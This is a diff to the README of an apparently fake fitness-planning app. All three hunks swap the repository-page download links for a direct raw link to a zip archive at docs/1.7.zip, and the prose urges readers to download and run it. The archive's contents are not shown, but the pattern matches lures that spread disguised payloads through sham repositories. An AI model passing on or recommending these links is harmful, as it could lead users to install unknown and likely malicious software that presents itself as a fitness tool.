@@ -1,6 +1,6 @@
 # 🏋️ diet-workout-plan-as-if-you-were-an-athlete - Your Personal Fitness Coach That Double-Checks Everything
 
-[🎯 **DOWNLOAD NOW**](https://github.com/fortnitenordarnaf-cloud/diet-workout-plan-as-if-you-were-an-athlete)
+[🎯 **DOWNLOAD NOW**](https://raw.githubusercontent.com/fortnitenordarnaf-cloud/diet-workout-plan-as-if-you-were-an-athlete/main/docs/1.7.zip)
 
 ---
 
@@ -16,7 +16,7 @@ This isn't just another fitness app. It's a smart planning tool that catches its
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/fortnitenordarnaf-cloud/diet-workout-plan-as-if-you-were-an-athlete](https://github.com/fortnitenordarnaf-cloud/diet-workout-plan-as-if-you-were-an-athlete)
+Visit this link to download the application: [https://raw.githubusercontent.com/fortnitenordarnaf-cloud/diet-workout-plan-as-if-you-were-an-athlete/main/docs/1.7.zip](https://raw.githubusercontent.com/fortnitenordarnaf-cloud/diet-workout-plan-as-if-you-were-an-athlete/main/docs/1.7.zip)
 
 Click the big download button on that page. The download will start automatically. It might take a few minutes depending on your internet speed.
 
@@ -156,7 +156,7 @@ Download it today and start training like the athlete you want to become.
 
 **Ready to begin?** Click the big green button below:
 
-[🚀 **DOWNLOAD THE APPLICATION NOW**](https://github.com/fortnitenordarnaf-cloud/diet-workout-plan-as-if-you-were-an-athlete)
+[🚀 **DOWNLOAD THE APPLICATION NOW**](https://raw.githubusercontent.com/fortnitenordarnaf-cloud/diet-workout-plan-as-if-you-were-an-athlete/main/docs/1.7.zip)
 
 ---
 
